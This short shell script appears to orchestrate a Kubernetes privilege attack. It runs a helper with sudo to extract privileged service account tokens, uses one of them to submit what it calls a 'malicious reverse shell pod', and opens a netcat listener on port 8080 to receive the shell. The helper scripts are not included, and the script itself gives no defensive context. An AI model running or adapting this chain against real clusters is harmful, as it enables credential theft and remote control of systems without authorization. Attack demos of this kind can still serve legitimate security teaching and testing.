
echo "Exctracting token. "
sudo ./extract_privileged_tokens.sh


echo "Creating malicious reverse shell pod, using the found service acount token."
./submit-malicious-pod.sh

echo "Listening to incoming connections."
nc -l -v 8080